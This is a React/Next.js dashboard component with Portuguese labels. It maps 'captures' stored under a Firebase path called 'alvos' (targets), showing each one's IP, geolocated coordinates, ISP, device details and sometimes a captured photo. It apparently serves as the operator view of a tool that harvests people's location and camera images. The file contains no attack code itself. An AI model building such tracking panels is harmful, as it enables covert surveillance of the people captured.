"use client"

import type React from "react"

import { useState, useEffect, useRef } from "react"
import { CyberWorldMap } from "@/components/cyber-world-map"
import { ref, onValue, off } from "firebase/database"
import { database } from "@/lib/firebase"
import type { CaptureData } from "@/lib/geolocation"
import { getCurrentUserId } from "@/lib/user-context"
import { Card, CardContent } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Button } from "@/components/ui/button"
import { MapPin, Globe, X, ChevronLeft, ImageIcon, Navigation, Camera, Trash2 } from "lucide-react"
import { cn } from "@/lib/utils"
import { deleteCapture } from "@/lib/delete-capture"
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog"

export default function CyberMapDashboard() {
  const [captures, setCaptures] = useState<CaptureData[]>([])
  const [loading, setLoading] = useState(true)
  const [selectedCapture, setSelectedCapture] = useState<CaptureData | null>(null)
  const [sidebarOpen, setSidebarOpen] = useState(false)
  const [mapScale, setMapScale] = useState(147)
  const [mapCenter, setMapCenter] = useState<[number, number]>([0, 20])
  const [showPhotoModal, setShowPhotoModal] = useState(false)
  const [captureToDelete, setCaptureToDelete] = useState<CaptureData | null>(null)
  const [isDeleting, setIsDeleting] = useState(false)
  const isDragging = useRef(false)
  const lastPosition = useRef<{ x: number; y: number } | null>(null)
  const [isMobile, setIsMobile] = useState(false)

  useEffect(() => {
    const userId = getCurrentUserId()

    console.log("[v0] 🗺️ ========== MAP DASHBOARD INITIALIZING ==========")
    console.log("[v0] 👤 Current user ID:", userId)

    if (!userId) {
      console.error("[v0] ❌ No user logged in - cannot load captures")
      setLoading(false)
      return
    }

    const firebasePath = `alvos/${userId}`
    const capturesRef = ref(database, firebasePath)

    console.log("[v0] 📡 Setting up Firebase real-time listener")
    console.log("[v0] 📂 Listening to path:", firebasePath)
    console.log("[v0] 🔄 Listener type: onValue (real-time)")

    const handleData = (snapshot: any) => {
      console.log("[v0] 🔥 ========== FIREBASE DATA RECEIVED ==========")
      console.log("[v0] 📊 Snapshot exists:", snapshot.exists())
      console.log("[v0] 🔑 Snapshot key:", snapshot.key)

      if (snapshot.exists()) {
        const data = snapshot.val()
        const dataKeys = Object.keys(data)

        console.log("[v0] 📦 Raw data keys count:", dataKeys.length)
        console.log("[v0] 🔑 First 5 keys:", dataKeys.slice(0, 5))

        const capturesArray: CaptureData[] = Object.entries(data)
          .map(([firebaseKey, value]: [string, any]) => {
            const capture = {
              ...(value as CaptureData),
              id: firebaseKey,
            }

            const hasIpData = !!capture.ipData
            const hasCoords = !!(capture.ipData?.latitude && capture.ipData?.longitude)
            const isLocation = capture.pageType === "location"

            console.log("[v0] 📋 Processing capture:", {
              id: firebaseKey.substring(0, 8) + "...",
              pageType: capture.pageType,
              isLocation,
              hasIpData,
              hasCoords,
              coords: hasCoords ? `${capture.ipData!.latitude}, ${capture.ipData!.longitude}` : "MISSING",
              location: capture.ipData ? `${capture.ipData.city}, ${capture.ipData.country}` : "NO LOCATION",
              timestamp: new Date(capture.timestamp).toISOString(),
            })

            return capture
          })
          .filter((c) => {
            const isLocation = c.pageType === "location"
            if (!isLocation) {
              console.log("[v0] ⏭️ Filtered out (not location):", c.id.substring(0, 8))
              return false
            }
            return true
          })

        const withValidCoords = capturesArray.filter((c) => c.ipData?.latitude && c.ipData?.longitude)

        console.log("[v0] ✅ ========== FILTERING RESULTS ==========")
        console.log("[v0] 📊 Total captures in Firebase:", dataKeys.length)
        console.log("[v0] 📍 Location captures:", capturesArray.length)
        console.log("[v0] ✓ With valid coordinates:", withValidCoords.length)
        console.log("[v0] ❌ Filtered out:", dataKeys.length - capturesArray.length)

        withValidCoords.forEach((c, index) => {
          console.log(`[v0] 🗺️ Marker ${index + 1}:`, {
            location: `${c.ipData!.city}, ${c.ipData!.country}`,
            coords: `${c.ipData!.latitude}, ${c.ipData!.longitude}`,
            ip: c.ipData!.ip,
          })
        })

        // Sort by timestamp (newest first)
        const sortedCaptures = capturesArray.sort((a, b) => {
          const timeA = typeof a.timestamp === "number" ? a.timestamp : new Date(a.timestamp).getTime()
          const timeB = typeof b.timestamp === "number" ? b.timestamp : new Date(b.timestamp).getTime()
          return timeB - timeA
        })

        console.log("[v0] 🎯 Setting captures state with", sortedCaptures.length, "items")
        console.log("[v0] 🗺️ Map should now display", withValidCoords.length, "markers")
        setCaptures(sortedCaptures)
      } else {
        console.warn("[v0] ⚠️ No data exists at path:", firebasePath)
        console.log("[v0] 💡 This means no captures have been saved yet")
        setCaptures([])
      }
      setLoading(false)
      console.log("[v0] 🏁 ========== DATA PROCESSING COMPLETE ==========")
    }

    const handleError = (error: Error) => {
      console.error("[v0] ❌ ========== FIREBASE ERROR ==========")
      console.error("[v0] 🔥 Firebase listener error:", error)
      console.error("[v0] 📋 Error details:", {
        name: error.name,
        message: error.message,
        stack: error.stack,
      })
      setLoading(false)
    }

    onValue(capturesRef, handleData, handleError)

    return () => {
      console.log("[v0] 🔌 Cleaning up Firebase listener for path:", firebasePath)
      off(capturesRef, "value", handleData)
    }
  }, [])

  useEffect(() => {
    const handleResize = () => {
      const mobile = window.innerWidth < 768
      setIsMobile(mobile)
      if (!mobile) {
        setSidebarOpen(true)
      }
    }
    handleResize()
    window.addEventListener("resize", handleResize)
    return () => window.removeEventListener("resize", handleResize)
  }, [])

  const handleTouchStart = (e: React.TouchEvent) => {
    if (e.touches.length === 1) {
      isDragging.current = true
      lastPosition.current = { x: e.touches[0].clientX, y: e.touches[0].clientY }
    }
  }

  const handleTouchMove = (e: React.TouchEvent) => {
    if (!isDragging.current || !lastPosition.current || e.touches.length !== 1) return

    const dx = (e.touches[0].clientX - lastPosition.current.x) * 0.1
    const dy = (e.touches[0].clientY - lastPosition.current.y) * 0.1

    setMapCenter(([lng, lat]) => [lng - dx, lat + dy])
    lastPosition.current = { x: e.touches[0].clientX, y: e.touches[0].clientY }
  }

  const handleTouchEnd = () => {
    isDragging.current = false
    lastPosition.current = null
  }

  const handleWheel = (e: React.WheelEvent) => {
    e.preventDefault()
    const delta = e.deltaY > 0 ? -10 : 10
    setMapScale((prev) => Math.max(100, Math.min(400, prev + delta)))
  }

  const handleMouseDown = (e: React.MouseEvent) => {
    isDragging.current = true
    lastPosition.current = { x: e.clientX, y: e.clientY }
  }

  const handleMouseMove = (e: React.MouseEvent) => {
    if (!isDragging.current || !lastPosition.current) return

    const dx = (e.clientX - lastPosition.current.x) * 0.1
    const dy = (e.clientY - lastPosition.current.y) * 0.1

    setMapCenter(([lng, lat]) => [lng - dx, lat + dy])
    lastPosition.current = { x: e.clientX, y: e.clientY }
  }

  const handleMouseUp = () => {
    isDragging.current = false
    lastPosition.current = null
  }

  const formatDate = (timestamp: number) => {
    return new Date(timestamp).toLocaleString("pt-BR", {
      day: "2-digit",
      month: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
    })
  }

  const handleDeleteCapture = async () => {
    if (!captureToDelete) return

    setIsDeleting(true)
    const success = await deleteCapture(captureToDelete.id)

    if (success) {
      if (selectedCapture?.id === captureToDelete.id) {
        setSelectedCapture(null)
      }
    }

    setIsDeleting(false)
    setCaptureToDelete(null)
  }

  if (loading) {
    return (
      <div className="flex items-center justify-center h-full w-full bg-black">
        <div className="text-green-400 text-sm md:text-xl animate-pulse">Carregando mapa de localizações...</div>
      </div>
    )
  }

  return (
    <div className="-mx-4 md:-mx-6 lg:-mx-8 -my-6 h-[calc(100vh-3.5rem)] md:h-[calc(100vh-4rem)] w-[calc(100%+2rem)] md:w-[calc(100%+3rem)] lg:w-[calc(100%+4rem)] bg-black text-white flex relative overflow-hidden">
      <div
        className={cn("flex-1 relative cursor-move select-none touch-none", isMobile && sidebarOpen && "hidden")}
        onWheel={handleWheel}
        onMouseDown={handleMouseDown}
        onMouseMove={handleMouseMove}
        onMouseUp={handleMouseUp}
        onMouseLeave={handleMouseUp}
        onTouchStart={handleTouchStart}
        onTouchMove={handleTouchMove}
        onTouchEnd={handleTouchEnd}
      >
        <CyberWorldMap
          captures={captures}
          onMarkerClick={setSelectedCapture}
          highlightedCaptureId={selectedCapture?.id}
          scale={mapScale}
          center={mapCenter}
        />

        <div className="absolute bottom-4 left-4 md:bottom-6 md:left-6 flex flex-col gap-2 z-10">
          <Button
            size="icon"
            variant="outline"
            className="bg-black/90 border-green-500/30 hover:bg-green-500/20 hover:border-green-500 h-10 w-10 md:h-12 md:w-12 shadow-lg transition-all active:scale-95"
            onClick={() => setMapScale((prev) => Math.min(400, prev + 20))}
          >
            <span className="text-green-400 text-xl md:text-2xl font-bold leading-none">+</span>
          </Button>
          <Button
            size="icon"
            variant="outline"
            className="bg-black/90 border-green-500/30 hover:bg-green-500/20 hover:border-green-500 h-10 w-10 md:h-12 md:w-12 shadow-lg transition-all active:scale-95"
            onClick={() => setMapScale((prev) => Math.max(100, prev - 20))}
          >
            <span className="text-green-400 text-xl md:text-2xl font-bold leading-none">−</span>
          </Button>
          <Button
            size="icon"
            variant="outline"
            className="bg-black/90 border-green-500/30 hover:bg-green-500/20 hover:border-green-500 h-10 w-10 md:h-12 md:w-12 shadow-lg transition-all active:scale-95"
            onClick={() => {
              setMapScale(147)
              setMapCenter([0, 20])
            }}
          >
            <span className="text-green-400 text-base md:text-lg font-bold">⟲</span>
          </Button>
        </div>
      </div>

      <div
        className={cn(
          "fixed md:absolute inset-0 md:inset-auto md:right-0 md:top-0 md:h-full bg-gray-950 md:bg-gray-950/95 backdrop-blur border-l border-gray-800 transition-all duration-300 flex z-40",
          sidebarOpen ? "translate-x-0 md:w-96" : "translate-x-full md:translate-x-0 md:w-0",
        )}
      >
        <div
          className={cn(
            "w-full md:w-96 flex flex-col overflow-hidden",
            !sidebarOpen && "md:opacity-0 md:pointer-events-none",
          )}
        >
          <div className="px-4 py-3 md:px-4 md:py-3 bg-gray-900 border-b border-gray-800 flex items-center justify-between flex-shrink-0">
            <div>
              <h3 className="text-base md:text-lg font-semibold text-white flex items-center gap-2">
                <MapPin className="h-4 w-4 md:h-5 md:w-5 text-green-400" />
                Capturas de Localização
              </h3>
              <p className="text-xs md:text-sm text-gray-400 mt-0.5">{captures.length} registros</p>
            </div>
          </div>

          <div className="flex-1 overflow-y-auto overscroll-contain p-3 md:p-4 space-y-2.5 md:space-y-3">
            {captures.slice(0, 50).map((capture) => {
              const isSelected = selectedCapture?.id === capture.id
              const hasPhoto = capture.formData?.photo

              return (
                <Card
                  key={capture.id}
                  className={cn(
                    "cursor-pointer transition-all hover:border-green-500/50 active:scale-[0.98]",
                    isSelected && "border-green-500 bg-green-500/5 shadow-lg shadow-green-500/10",
                  )}
                  onClick={() => setSelectedCapture(capture)}
                >
                  <CardContent className="p-3 md:p-3 space-y-2.5">
                    <div className="flex items-center justify-between gap-2">
                      <Badge variant="outline" className="capitalize text-xs border-green-500/50 text-green-400">
                        <Navigation className="h-3 w-3 mr-1" />
                        Localização
                      </Badge>
                      <div className="flex items-center gap-2">
                        <span className="text-[10px] md:text-xs text-gray-500 font-mono">
                          {formatDate(capture.timestamp)}
                        </span>
                        <Button
                          variant="ghost"
                          size="icon"
                          className="h-6 w-6 hover:bg-red-500/20 hover:text-red-400 transition-colors"
                          onClick={(e) => {
                            e.stopPropagation()
                            setCaptureToDelete(capture)
                          }}
                        >
                          <Trash2 className="h-3 w-3" />
                        </Button>
                      </div>
                    </div>

                    {hasPhoto && (
                      <div className="relative rounded-md overflow-hidden border border-purple-500/30">
                        <img
                          src={capture.formData?.photo || "/placeholder.svg"}
                          alt="Foto"
                          className="w-full h-24 md:h-28 object-cover"
                        />
                        <div className="absolute top-1.5 right-1.5 px-2 py-1 rounded bg-purple-500/90 text-white text-[10px] font-medium flex items-center gap-1 shadow-lg">
                          <Camera className="h-3 w-3" />
                          Foto
                        </div>
                      </div>
                    )}

                    {capture.ipData && (
                      <div className="space-y-1">
                        <div className="flex items-center gap-2 text-sm text-gray-300">
                          <Globe className="h-3.5 w-3.5 text-blue-400 flex-shrink-0" />
                          <span className="truncate">
                            {capture.ipData.city}, {capture.ipData.country}
                          </span>
                        </div>
                        {capture.ipData.latitude && capture.ipData.longitude && (
                          <div className="text-xs text-blue-400 font-mono pl-5">
                            {capture.ipData.latitude.toFixed(4)}°, {capture.ipData.longitude.toFixed(4)}°
                          </div>
                        )}
                        <div className="flex items-center gap-2 text-xs text-gray-400 pl-5">
                          <span className="font-mono text-xs truncate">{capture.ipData.ip}</span>
                        </div>
                      </div>
                    )}
                  </CardContent>
                </Card>
              )
            })}
          </div>

          <div className="border-t border-gray-800 bg-gray-900/90 p-3 md:p-4 space-y-2 md:space-y-3 max-h-[45vh] md:max-h-[50vh] overflow-y-auto overscroll-contain flex-shrink-0">
            <div className="flex items-center justify-between mb-1 md:mb-2">
              <h4 className="text-xs md:text-sm font-semibold text-white">Detalhes Completos</h4>
              <div className="flex items-center gap-1">
                {selectedCapture && (
                  <Button
                    variant="ghost"
                    size="sm"
                    className="h-6 px-2 text-xs hover:bg-red-500/20 hover:text-red-400"
                    onClick={() => setCaptureToDelete(selectedCapture)}
                  >
                    <Trash2 className="h-3 w-3 mr-1" />
                    Excluir
                  </Button>
                )}
              </div>
            </div>

            <div className="space-y-2 md:space-y-3 text-xs">
              {selectedCapture?.formData?.photo && (
                <div>
                  <Button
                    variant="outline"
                    size="sm"
                    className="w-full border-purple-500/30 hover:bg-purple-500/20 text-purple-400 bg-transparent text-xs h-8"
                    onClick={() => setShowPhotoModal(true)}
                  >
                    <ImageIcon className="h-3 w-3 mr-2" />
                    Ver Foto em Tela Cheia
                  </Button>
                </div>
              )}

              {selectedCapture?.ipData && (
                <div className="space-y-1.5 md:space-y-2 p-2 md:p-3 rounded-lg bg-blue-500/5 border border-blue-500/20">
                  <div className="font-semibold text-blue-400 flex items-center gap-2 text-xs md:text-sm">
                    <Globe className="h-3.5 w-3.5 md:h-4 md:w-4" />
                    Dados de Localização (IP)
                  </div>
                  <div className="space-y-1 text-[10px] md:text-xs">
                    {selectedCapture.ipData.latitude && selectedCapture.ipData.longitude && (
                      <>
                        <div className="flex justify-between gap-2">
                          <span className="text-gray-500">Latitude:</span>
                          <span className="text-white font-mono">{selectedCapture.ipData.latitude.toFixed(6)}°</span>
                        </div>
                        <div className="flex justify-between gap-2">
                          <span className="text-gray-500">Longitude:</span>
                          <span className="text-white font-mono">{selectedCapture.ipData.longitude.toFixed(6)}°</span>
                        </div>
                      </>
                    )}
                    <div className="flex justify-between gap-2">
                      <span className="text-gray-500">IP:</span>
                      <span className="text-white font-mono">{selectedCapture.ipData.ip}</span>
                    </div>
                    <div className="flex justify-between gap-2">
                      <span className="text-gray-500">Cidade:</span>
                      <span className="text-white truncate">{selectedCapture.ipData.city}</span>
                    </div>
                    <div className="flex justify-between gap-2">
                      <span className="text-gray-500">Região:</span>
                      <span className="text-white truncate">{selectedCapture.ipData.region}</span>
                    </div>
                    <div className="flex justify-between gap-2">
                      <span className="text-gray-500">País:</span>
                      <span className="text-white">{selectedCapture.ipData.country}</span>
                    </div>
                    {selectedCapture.ipData.org && (
                      <div className="flex justify-between gap-2">
                        <span className="text-gray-500">ISP:</span>
                        <span className="text-white text-right truncate">{selectedCapture.ipData.org}</span>
                      </div>
                    )}
                  </div>
                </div>
              )}

              <div className="space-y-1 p-2 md:p-3 rounded-lg bg-gray-800/50 border border-gray-700">
                <div className="font-semibold text-gray-300 mb-1.5 md:mb-2 text-xs md:text-sm">
                  Informações do Dispositivo
                </div>
                <div className="space-y-1 text-[10px] md:text-xs">
                  <div className="flex justify-between gap-2">
                    <span className="text-gray-500">Timestamp:</span>
                    <span className="text-white">{formatDate(selectedCapture?.timestamp)}</span>
                  </div>
                  {selectedCapture?.deviceInfo?.platform && (
                    <div className="flex justify-between gap-2">
                      <span className="text-gray-500">Plataforma:</span>
                      <span className="text-white truncate">{selectedCapture.deviceInfo.platform}</span>
                    </div>
                  )}
                  {selectedCapture?.deviceInfo?.language && (
                    <div className="flex justify-between gap-2">
                      <span className="text-gray-500">Idioma:</span>
                      <span className="text-white">{selectedCapture.deviceInfo.language}</span>
                    </div>
                  )}
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {sidebarOpen && isMobile && (
        <Button
          variant="outline"
          size="icon"
          className="fixed bottom-6 right-6 bg-red-500/90 border-red-500 hover:bg-red-600 z-[70] h-14 w-14 shadow-2xl transition-all active:scale-95 rounded-full"
          onClick={() => {
            setSelectedCapture(null)
            setSidebarOpen(false)
          }}
        >
          <X className="h-6 w-6 text-white" />
        </Button>
      )}

      {!sidebarOpen && (
        <Button
          variant="outline"
          size="icon"
          className="fixed right-4 top-20 md:absolute md:right-4 md:top-4 bg-black/90 border-green-500/30 hover:bg-green-500/20 z-[60] h-11 w-11 md:h-12 md:w-12 shadow-lg transition-all active:scale-95"
          onClick={() => setSidebarOpen(true)}
        >
          <ChevronLeft className="h-5 w-5 text-green-400" />
        </Button>
      )}

      {showPhotoModal && selectedCapture?.formData?.photo && (
        <div
          className="fixed inset-0 bg-black/98 z-50 flex items-center justify-center p-3 md:p-4"
          onClick={() => setShowPhotoModal(false)}
        >
          <div className="relative max-w-5xl w-full">
            <Button
              variant="ghost"
              size="icon"
              className="absolute -top-10 md:-top-14 right-0 text-white hover:bg-white/10 h-9 w-9 md:h-10 md:w-10"
              onClick={() => setShowPhotoModal(false)}
            >
              <X className="h-5 w-5 md:h-6 md:w-6" />
            </Button>
            <div className="relative">
              <img
                src={selectedCapture.formData.photo || "/placeholder.svg"}
                alt="Foto capturada"
                className="w-full h-auto rounded-lg border-2 md:border-4 border-green-500/50 shadow-2xl"
                onClick={(e) => e.stopPropagation()}
              />
              <div className="absolute top-2 left-2 md:top-4 md:left-4 px-2 py-1 md:px-3 md:py-2 rounded-lg bg-black/80 backdrop-blur border border-green-500/30">
                <div className="text-green-400 text-xs md:text-sm font-semibold">📸 Foto Capturada</div>
              </div>
            </div>
            <div className="mt-3 md:mt-4 p-2.5 md:p-4 rounded-lg bg-gray-900/80 backdrop-blur border border-gray-800">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-2 md:gap-4 text-[10px] md:text-sm">
                <div>
                  <span className="text-gray-400">Data:</span>
                  <span className="text-white ml-2">{formatDate(selectedCapture?.timestamp)}</span>
                </div>
                {selectedCapture?.ipData && (
                  <div>
                    <span className="text-gray-400">Local:</span>
                    <span className="text-white ml-2">
                      {selectedCapture.ipData.city}, {selectedCapture.ipData.country}
                    </span>
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>
      )}

      <AlertDialog open={!!captureToDelete} onOpenChange={(open) => !open && setCaptureToDelete(null)}>
        <AlertDialogContent className="bg-gray-950 border-gray-800">
          <AlertDialogHeader>
            <AlertDialogTitle className="text-white">Confirmar Exclusão</AlertDialogTitle>
            <AlertDialogDescription className="text-gray-400">
              Tem certeza que deseja excluir esta captura de localização? Esta ação não pode ser desfeita.
              {captureToDelete?.ipData && (
                <div className="mt-3 p-3 rounded-lg bg-gray-900 border border-gray-800">
                  <p className="text-sm text-gray-300">
                    📍 {captureToDelete.ipData.city}, {captureToDelete.ipData.country}
                  </p>
                  <p className="text-xs text-gray-500 mt-1">{formatDate(captureToDelete.timestamp)}</p>
                </div>
              )}
            </AlertDialogDescription>
          </AlertDialogHeader>
          <AlertDialogFooter>
            <AlertDialogCancel className="bg-gray-800 border-gray-700 hover:bg-gray-700 text-white">
              Cancelar
            </AlertDialogCancel>
            <AlertDialogAction
              onClick={handleDeleteCapture}
              disabled={isDeleting}
              className="bg-red-500 hover:bg-red-600 text-white"
            >
              {isDeleting ? "Excluindo..." : "Excluir"}
            </AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>
    </div>
  )
}
